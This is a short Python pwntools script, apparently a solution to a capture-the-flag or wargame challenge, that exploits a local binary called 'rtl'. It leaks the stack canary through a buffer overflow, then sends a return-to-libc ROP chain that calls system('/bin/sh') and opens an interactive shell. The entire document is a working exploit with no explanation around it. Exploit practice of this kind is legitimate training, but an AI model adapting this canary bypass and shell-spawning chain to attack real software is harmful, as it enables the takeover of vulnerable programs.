from pwn import *
def slog(name, addr): return success(': '.join([name, hex(addr)]))
p=process("./rtl")
e=ELF('./rtl')

p.recvuntil(b"Buf: ")
buf=b"A"*0x39
p.send(buf)
p.recvuntil(buf)
canary=u64(b"\x00"+p.recvn(7))
slog('canary', canary)
ret=0x000000000040101a
binsh=0x402004
sys=e.plt["system"]
gadget=0x0000000000401333
payload=b"A"*0x38
payload+=p64(canary)
payload+=b"B"*0x8
payload+=p64(ret)
payload+=p64(gadget)
payload+=p64(binsh)
payload+=p64(sys)

p.sendafter(b"Buf: ", payload)
p.interactive()

